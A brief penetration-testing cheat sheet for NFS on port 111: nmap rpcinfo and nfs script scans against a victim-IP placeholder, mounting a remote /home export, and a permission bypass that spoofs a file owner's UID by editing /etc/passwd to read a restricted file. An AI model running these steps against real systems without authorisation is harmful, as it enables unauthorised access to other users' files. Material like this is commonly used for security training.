# 111 - NFS

---

- [nMap Scripts](#nmap-scripts)
- [Mounting](#mounting)
- [Permission Bypass](#permission-bypass)

> {info} **NFS** stands for **Network File Share**

<a name="nmap-scripts"></a>
## nMap Scripts
Scanning with rpcinfo script across all hosts.
```sh
nmap -v -p 111 --script=rpcinfo 192.168.0.1-254 -oG sweep-rpcbind-info.txt
```

Runs nfs scripts against the host.
```sh
nmap -p 111 --script nfs* __VICTIM_IP__
```

<a name="mounting"></a>
## Mounting
Mount the NFS folder “home” to the local ~/home. -o nolock prevents file locking.
```sh
sudo mount -o nolock,nfsvers=3 __VICTIM_IP__:/home ~/home/
```

<a name="permission-bypass"></a>
## Permission Bypass
Read/Write/Execute only by UUID 1014.
```sh
-rwx------ 1 1014 1014 48 Jun 10 09:16 secret.txt
```

Access it by adding a local user with UUID to 1014, logging in as that user and viewing the file. Check the user id of the newly created user and replace it in `/etc/passwd`.
```sh
sudo adduser nfsbypass
sudo sed -i -e 's/1001/1014/g' /etc/passwd
su nfsbypass
cat secret.txt
```
